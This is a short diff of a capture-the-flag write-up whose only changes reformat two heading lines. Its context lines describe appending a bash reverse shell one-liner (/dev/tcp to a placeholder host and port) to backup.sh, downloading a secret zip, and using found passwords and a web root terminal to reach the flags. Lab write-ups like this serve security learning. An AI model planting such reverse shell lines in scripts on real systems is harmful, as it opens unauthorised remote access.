@@ -57,7 +57,7 @@ __bash -i >& /dev/tcp/host_ip/port 0>&1__ --> added in backup.sh
 
 Note: we can't use nano because it's not on this machine we have to use vim editor.
 
-#After we get a shell we got the first flag in local.txt.
+# After we get a shell we got the first flag in local.txt.
 
 We can run python2 on this so let's start a http server and download the secret.zip file onto our system.
 
@@ -73,6 +73,6 @@ ___root: contents of Mypasswords.txt___
 
 Now here on the website we see a tab saying terminal. Going to it we see we have a root terminal shell.
 
-#We can change into the root directory and read the proof.txt
+# We can change into the root directory and read the proof.txt
 
 And That's it.
